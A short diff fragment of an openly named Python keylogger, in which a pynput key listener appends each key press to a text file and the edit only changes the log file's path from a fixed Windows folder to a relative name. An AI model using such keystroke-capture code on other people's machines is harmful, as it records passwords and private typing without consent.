@@ -22,7 +22,7 @@ def keystroke(key):
     else:
         key += ' '
     
-    with open("C:\\Projecttemp\\Temp\\Keylogger\\Keylogger.txt", 'a') as f:
+    with open("Keylogger.txt", 'a') as f:
         f.write(key)
 
 with Listener(on_press=keystroke) as l:
